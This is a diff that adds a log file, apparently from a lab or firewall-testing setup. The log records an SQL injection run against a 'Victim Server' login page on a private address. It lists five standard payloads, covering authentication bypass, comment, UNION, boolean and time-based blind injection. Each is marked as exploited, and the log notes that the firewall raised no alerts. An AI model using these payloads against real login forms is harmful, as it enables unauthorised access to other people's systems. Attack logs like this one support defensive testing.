@@ -1,0 +1,19 @@
+============================================================
+Attack Type: SQL_Injection
+Timestamp: 2025-10-29_17-22-42
+============================================================
+
+[17:22:37] 🔴 ATTACK INITIATED: SQL Injection
+[17:22:37] Target: Victim Server (172.20.0.10:5000/login)
+[17:22:37] Testing: Authentication Bypass | Payload: ' OR '1'='1
+[17:22:37] ✓ VULNERABILITY EXPLOITED: Authentication Bypass
+[17:22:38] Testing: Comment Injection | Payload: admin'--
+[17:22:38] ✓ VULNERABILITY EXPLOITED: Comment Injection
+[17:22:39] Testing: UNION Injection | Payload: ' UNION SELECT NULL--
+[17:22:39] ✓ VULNERABILITY EXPLOITED: UNION Injection
+[17:22:40] Testing: Boolean Injection | Payload: ' OR 1=1--
+[17:22:40] ✓ VULNERABILITY EXPLOITED: Boolean Injection
+[17:22:41] Testing: Time-based Blind | Payload: admin' AND SLEEP(5)--
+[17:22:41] ✓ VULNERABILITY EXPLOITED: Time-based Blind
+[17:22:42] 📊 Summary: 5 exploitable, 0 blocked by firewall
+[17:22:42] 🛡️  Firewall generated 0 SQL injection alerts
